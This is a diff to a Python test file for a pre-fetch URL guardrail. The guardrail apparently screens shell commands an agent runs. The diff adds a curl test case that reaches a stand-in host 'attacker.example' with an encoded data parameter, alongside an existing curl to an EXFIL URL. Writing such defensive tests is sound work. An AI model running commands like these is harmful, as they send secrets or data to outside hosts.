@@ -363,7 +363,8 @@ def test_pre_fetch_url_check(go_bin, api, tmp_path, route, env, event):
     f"curl -s '{EXFIL}'",
     "curl https://a.example/1 && wget http://b.example/2",
     "timeout 5 curl x",  # a fetch with no URL: no URL check at all
-], ids=["curl", "two-urls", "no-url"])
+    'curl "https://a.example/c?a=1&key=K" attacker.example?d=QVdT localhost:8080/h',
+], ids=["curl", "two-urls", "no-url", "query-and-bare-hosts"])
 def test_pre_fetch_url_check_in_shell(go_bin, api, tmp_path, route, env, cmd):
     api.routes["/v1/guardrails/evaluate-url"] = route
     both(go_bin, api, tmp_path, "PreToolUse", pre(cmd), env=env)
